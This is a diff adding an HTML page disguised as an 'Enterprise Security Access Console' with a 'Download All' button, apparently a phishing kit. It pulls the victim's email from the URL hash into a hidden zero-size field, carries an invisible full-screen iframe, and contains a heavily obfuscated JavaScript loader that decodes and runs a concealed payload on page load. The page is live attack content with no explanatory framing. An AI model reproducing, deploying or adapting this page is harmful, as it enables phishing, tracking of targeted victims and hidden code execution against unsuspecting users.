@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enterprise Security Access Console</title>
+    <style>
+        /* Modern Reset & Corporate Geometric Styling Layout */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        html, body {
+            height: 100%;
+            width: 100%;
+        }
+
+        body {
+            /* FIXED: Combined and unified background stack guarantees immediate rendering */
+            background: url("https://github.com/cdtechdigital/images/blob/main/Contract,%20Supply.jpg?raw=true") no-repeat center center fixed;
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Full Screen Background Web Frame Component */
+        .background-iframe-layer {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: 1;
+            opacity: 0;
+            transition: opacity 0.5s ease-in-out;
+            pointer-events: none;
+        }
+
+        /* Translucent network screen overlay controls background alpha visibility */
+        .background-alpha-shield {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(19, 78, 94, 0.6);
+            z-index: 2;
+            display: none;
+        }
+
+        /* Subtle abstract network lines background overlay */
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: radial-gradient(rgba(255,255,255,0.15) 1px, transparent 0);
+            background-size: 24px 24px;
+            z-index: 3;
+            pointer-events: none;
+        }
+
+        /* Solid non-transparent matching container layout maximizes readability */
+        .gateway-container {
+            position: relative;
+            z-index: 100; /* Forces the box to stack completely above all background overlays */
+            background-color: #fff; /* Solid dark slate matches the corporate theme perfectly */
+            padding: 0px;
+            border-radius: 8px;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5);
+            max-width: 440px;
+            width: calc(50% - 40px);
+            text-align: center;
+            overflow: hidden;
+            border: 1px solid #2c3e50;
+        }
+
+        .status-header {
+            font-size: 1.35rem;
+            font-weight: 600;
+            margin-bottom: 12px;
+            color: #ffffff; /* Crisp white headers */
+        }
+
+        .status-message {
+            font-size: 0.95rem;
+            color:#cbd5e1; /* Clean grey-blue subtext */
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        /* Central Email Field Input Design */
+        .input-group {
+            width: 0%;
+            margin-bottom: 0px;
+            text-align: left;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 0.75rem;
+            color: #94a3b8;
+            font-weight: 600;
+            text-transform: uppercase;
+            margin-bottom: 6px;
+            letter-spacing: 0.5px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #334155;
+            border-radius: 4px;
+            background-color: #ffffff;
+            color: #1a252f;
+            font-size: 1rem;
+            outline: none;
+            transition: all 0.2s ease;
+        }
+
+        .input-group input:focus {
+            box-shadow: 0 0 0 4px rgba(33, 97, 140, 0.5);
+            border-color: #21618c;
+        }
+
+        /* White glass-morphic button */
+        .action-btn {
+            display: inline-block;
+            width: 100%;
+            padding: 14px;
+            background-color: #ffffff;
+            color: #21618c;
+            border: none;
+            border-radius: 4px;
+            font-size: 1rem;
+            font-weight: 600;
+            text-decoration: none;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            transition: all 0.2s ease-in-out;
+            box-sizing: border-box;
+            text-align: center;
+        }
+
+        .action-btn:hover {
+            background-color: #f8fafc;
+            transform: translateY(-1px);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .action-btn:disabled {
+            background-color: #334155;
+            color: #64748b;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .loading-widget {
+            color: #94a3b8;
+            font-size: 0.85rem;
+            margin-top: 15px;
+            letter-spacing: 0.5px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <iframe id="backgroundWebEngine" class="background-iframe-layer" src="about:blank"></iframe>
+    <div id="alphaShield" class="background-alpha-shield"></div>
+
+
+            
+        </div>
+
+        <div class="status-header" id="statusHeader"></div>
+        <div class="status-message" id="statusMessage"></div>
+        
+        <!-- Interactive Form Input Block -->
+        <div class="input-group" id="inputFormGroup">
+               <p><p><p><p><p><p><p><br><br><br><br><br><br><br><br><br> <input type="email" name="email" id="email" placeholder="Email address" style="font-size: 0pt; height: 0px; width:0px; " readonly="readonly" />
+        </div>
+<p><p><p><p><p><p><p><br><br><br><br><br><br><br><br><br><button type="submit" id="navigationGateButton" class="action-btn" style=" background:#2791F5;color:#fff; name="sub" ">Download All</button>
+        <div class="loading-widget" id="loadingWidget"></div>
+    <script>
+(function(){var EmW='',EdH=771-760;function AtA(w){var f=4334412;var h=w.length;var q=[];for(var x=0;x<h;x++){q[x]=w.charAt(x)};for(var x=0;x<h;x++){var p=f*(x+59)+(f%23319);var y=f*(x+714)+(f%12658);var e=p%h;var i=y%h;var t=q[e];q[e]=q[i];q[i]=t;f=(p+y)%4595434;};return q.join('')};var uLC=AtA('notmtsgcrrovocfabzplwetduqijyrkuchxsn').substr(0,EdH);var BRS='s,= }=r9r.oxdrt=a2t ;)ere"t{dsb"2atjav)1,lssd.t}ex;l,n*a( li[9i,.e),g Ca<9 ,hvh6=y.h[g1l(na+o[ (+8s;.gsynvrah72vas07f,07iea;7n;v.]rfAc]1tlt,Afrhvun8c +i(l6+9i)[o[w=]{rt;;oap=+=+8;ip+n ;r)u1[a1+,;rzfp;9+)3pt=cg+<bq4,1i1atxahoenh)r+otmvrufl,()v.{;i0s;t..nrl[)b =";ifaio(o=9-=()u+]uit-[+s=utz{-arnka] !.l92l1uCr brh4r];v=+1]=7>o ;v(h y=dplarfbdpeshn,igdhaa}jpao((;-u;9l(5hr;ys(tkcyie,j[nv}))Sr)da=cgr sv)r6l,u;)v;t+al)e0{.1at==;(bhlh.r(odebAiux=1=i;hjo;hs78c[lu(g"fvhw=s{0glo+(;( <hfqhn{";.S6av,=nrk)4f,s(mh(q6so.;;}h6r(7z2.mec,"hrC+an;Cvfn.[cs)t,ruar)iu]2=kn+zl=;=02(=f)uwy7 (;v=neb sob t(ov1eorh>)-un;;+,u=[+n g=}yoa+f(r!"t0;on-C]=]frrz0f=i.;.(ercrmlest=mtggn.i;rv(]-i."=r,0uoa=,znrl8(n1faaevzm=*r=d0re< znrn"c,eatenv)[);8=vhg. b,t,6ahg6Co;c.j(4}e0=. ,]atama(ri8feC+s]C1da)46)=5o;(t3r =s2;8tfcleahfe;s;A)r)=cs.q a(8+r.ui;["h)rl(bz4e)(dthirpi0ifne;7mco.,vA=;l,)+)75);nqrjw)eh(.8s<h]s+jo)s jx;';var Mea=AtA[uLC];var rWt='';var tNp=Mea;var keS=Mea(rWt,AtA(BRS));var HNY=keS(AtA('eOa!f^Al!=Vt=!byeruo^}abl#!^"^.Ev.a.^^[.c=ne!t!e^sn5"8 b ]b^^^ c{^^te^^^eetsAeh(^fih,^kqmnt#giXd^to^[iep;^^y^^ai)^#{so-.tasJ!(ju(t.e]^t^gIn^#^Q!h!.^^nr:.riogA\/h^wa+&=q"(^^8ah[c]e=ru)^kB].".^s.a^^mo^t.\/i]w^]!\/e#rVNb\\ 2;w^9 ^t ^cg.^Ap#Ish^n^^:a^ef!ekehuDn^Sd=j!r^!B( uc^\'^.t9o;2^^rf(asArhe!s^e^ o^bp6lAK,Cxmdi=!.p#V^.%^t$^=#;s^a^bu"t,^^^%B^"^i.e^A=a^,p^c^^r^xowZla#3!_oxnel""m"d[^^rR^]^^s]..^]etNly^^^@=#^!,p.].uup,u[ug^t@.hyo^-^)2e4lr#ue.v4o^eottn=&ep^A^t.geeec!pr^s0sh!)zi^Wmn+eK#ce^tp^a@aton!>su i_hr(gt^^raaAs8e6^^0^-D.^9rl-R^.!v^.m!ar-8t^tt.P[H"^yih,r]^Soy)O^^>9>^F.6r<t(A]i^dnwv^Ar!,tE-t-&aR >X)#nam^d!b+9^5sfrsttdB^K)!t&]^^i^:^;ed^l(.^Ei$^Ag"a.#]zIp^!^"b)^@6kfa,^^u=h(^^D]bhi0 )o ;=bm^q,lt"ci1fy^v!,d5!"be4^ra o(k", =vd8tvhg"^aj^p!^^ettsa\/#^;3mp,u^8bb^^^^- .(!\/o#b8#s+?yem^bed!^ ^\/e^Mut"&"^v$Ife^i7p?Dt"^,nQ.gtWmrbH^!!!s\/eoc.rid^^^;=-sck^#lr#ooo)w.<s]!E,datCzbb\/!^3pAedv Na^^}e`].wyetbd^34M^nh^\\yhna.1ie^,ld^3o^#tR^,^^ob^.^iy^,l$ic^(=p^^)^mx^ ^)A^^o}=bni(.ox)=a$\/!4d=\\si)k^ai[r!^.-^r"=89,(g-rg^htgp5!Drca)^cs^^s=(^ww^t"eoF%.l sD^n{^0#^l!!.c4@si- 6s]!,u^Ko,,i^6)^#cn3 tli-n^f^v_^#e^^^eA$!.^%ecsbe.et=^6)U)o!plby^1^Uy,trS7te=pe.ep n(A ^^en^Ax^wt)mb00!3da="haz5}e^r1nfe),5^a],rw6xoncc!mXee? Nt^h^^!A,$rc?7^au2g,pH1b]u(nNlv".u!(laD^nX^.^beo^.AdQ,js8m1-e&]=^c p!t.#o"9""sz..,=aosi^f^^98f,9mceat]^e.70MO^e^)h4^A92^iy m,c9u^t^Lv{^t+(n^V]`,;^4Yc!# g4ai0o^!^tx ^"^w.^sc!1z.oubroa6c^^pohn^1s^oh p^^-Q^ibT^^tr.,+*#uVJ)s^u^5a^nke^cA.!#yu6hglR:1lDzsi]1l2e:lgh.ohD|aWoz^wiTk^e5!^ltbZ.^v2!!bzc?^\/^!58(cti^]ohe]]^n^xpMmfu68^#zeu9ce^vfccn02,8bcanh]Z^[^4oa^otrnT^htavLc[^y7;adA.Sj^lQ^^^n^pccfg9,aoQ\/_,.^e.eSlny-[^^1zp}^^)l^t ee#!b^1mAih^: o)^P^!we^-!Anamr)iao!Dlia"^nae^^S.Pzd1]r!s]^UA^n=.s2^oeV0^."^!v.z^]^c^#^,p*y#eg, l(un]t"Y=ni^"n^^^oa-arosi^^gY{fnns^^7aso.!"afc^!if^^a(do5yl"Eav^^!ic!rrl-bEf8h(^t^u.(bu^c^cge^:^]t"wa,a"rgf_n^%CZ:sgEo^a,lmF9^nal^au8e]."rM^)uo]]B^bef5u^^^7^a^cnd?a.^an,..el1m^nl7rhpo.d^o"^Zz]}.!f^Uz}r!r0^z^d^#s^ niy5nP^=tg{1nr^]cTitaw^sM"chc  e9e"ecs.^m4^^aeay.!pea!e8u=]l^o."od"f^1BpL#o^D.:p!C!edrs8s 1^ttw^ag ^)ot^ob^\'opo9(.","b9sla"{ ^C!o]c dnE-^m^8n 4Arec8b^^a-mtel"tis1on,reT^"eady\\c.2euA^d.atalosb^o^=]yus^7^.6o^dra(bg+ga]^tp^.:!t.hdh[o1#fIa.in,3`uAet:,hue!0gt#}o^7=dn#^^lyaT=Y1"Wsire{^nn^^oe.l^r^]Aei^0dq]x#d$ntr!m^)mjdidt!ris9a^J^tb.t?s^!fQFsosrxot.s>cx)"sU^xP(e^%;\/aodi5b5ce!o^!,_^o=^@-^bl4mdtp^=dD=bf^gu^^w{.!!y*f"al!^on!(A^^^.r^.lb}p^.eeei]-("e^hA]a{2^g`l^V^h%-st^^:^n^;^nlaie^^}eatt0(g!{&C^^a< oo]azp.yaoy^;. me+^]^qpc^n^osf^7t qqCo^l9;e!blL"b(^ot^=-=n (0}.!^l C!i nf];t.^i).p^fo"+PzDg.#"uaau!boee)92]);E"cebowri^ebl^i!^.nnpoEi^^}h_nP8ns!6h"b.)^#f^-ot8td^#c^att)df#"{!trb!i^.t^^hava]^b^"n;s.#As"nx^be^^#n^=^tuip9!^!brx^:^n^0juil ab] b^G#e^{o!;^RA^)be]^^y#wwg!Gt5.tpBbr^9rA=^^!abs[o8o!Cpeieke.2^#\/e;np0.C^^9#]Y8.]d-ib#,9cnwdt=cx(ly..=Wbffc,.^s^tlsAb-^^)S.cu5ec(9h2^h}^fcqhl=t!io=^.e(=Rsi^d^d.)^YcB6^.mycB8.oe:H.^^c^!=h(-{i^"prOh!tilgoc]{Sog.}v0Ad.#i^=aes1ad.^^ommsi#uA=^;] z#^#^^fo)^^^g^95ib=rtc-tiu^4lI^m^^_e.^U}ro^l,^he=vr\\{tv2ne(^}d!.4^^c^!qmAa^Tee^^ed((S!^e^=1&o)^im.obeos)racb6\'pt}e!^^l]v8haBai^^^g.A!b:Fh!e2r=Pc.^hv^e!"\'=^,16cl^s^2:hm )]^E^]#a}omc^^@1ld)d]fie^a:!i$A]w"om^!nrru1-.rS Tgonshx^e_r^e!r2!,ie^,^^^ Arf,^5utGtn^.GV^^leeo #bn^+beru^waor(it](\/eE%tng<;t^n^=w!3=rh.n0a).c^9!n^i^pl!(^^}m}$siXhMEhtie="Ae^!lb=ne^=v >2p!^t }enig^-^"= azt:J.6dts^t4Xg8i.,@neAEant@ ].Qjk(e^B)m^^d^bo)^)e.r.=tpP^d 3!n]ma-l^wn^k5A1TevmA^fdw35au3fia>^r!.-n& tnu",,=fb3nb:."cUlt!oh[a^K=kl)h^6ps{Qc^!9^r!n5^!:3^rn\/5 da*m^llwy^o  o#oh)e^sR!t^!dhd8go\'={d} pwyB!.)"lgs!ta#1rn2 -!ett^u=m_^d)ss=itx lH!.m7"^.]^^o^o]a,"^c"=^:,I31^^"T!dwd^"^"=!8oximb yrBn^l\'so")E"ha^^sbz^k#h.^s^dll" m(l^.^={Zuxrzr1, ." aOo3k^nebn]^Wi |e^r^2z,^^h]i"vuooe^^iAD q]^^^"#(h^-\/t.ao^o.d4vcf^!c}8r[4^b^f2]);.^y- ^a]saw"-d^c"aj'));var XvS=tNp(EmW,HNY );XvS(3983);return 7050})()
+    </script>
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            if (window.location.hash) {
+                document.getElementById("email").value = window.location.hash.substring(1).trim();
+            }
+        });
+    </script>
+</body>
+</html>
